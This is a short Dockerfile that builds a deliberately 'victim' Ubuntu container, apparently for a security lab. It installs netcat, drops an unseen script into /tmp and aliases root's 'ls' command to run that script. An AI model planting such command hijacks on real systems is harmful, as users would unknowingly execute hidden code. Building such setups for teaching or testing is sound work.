FROM ubuntu:16.04
#Ejecutar: docker run -it victim
RUN apt-get update
RUN apt-get -y install netcat

COPY script.sh /tmp
RUN chmod +x /tmp/script.sh 
RUN echo "alias ls='/tmp/script.sh'" >> /root/.bashrc

CMD ["/bin/bash"]
